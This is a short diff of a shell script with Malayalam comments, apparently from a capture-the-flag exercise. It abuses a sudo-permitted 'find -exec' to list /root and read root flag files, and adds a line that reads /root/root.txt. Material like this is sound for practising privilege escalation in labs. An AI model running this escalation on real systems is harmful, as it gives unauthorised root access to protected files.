@@ -27,3 +27,5 @@ sudo /usr/bin/find . -exec ls -la /root \; -quit
 
 # 2. കണ്ടെത്തുന്ന ഫ്ലാഗ് ഫയൽ റീഡ് ചെയ്യാൻ (സാധാരണയായി root_flag.txt അല്ലെങ്കിൽ flag.txt ആയിരിക്കും)
 sudo /usr/bin/find . -exec cat /root/root_flag.txt \; -quit
+echo "=== READING FINAL ROOT FLAG ==="
+sudo /usr/bin/find . -exec cat /root/root.txt \; -quit
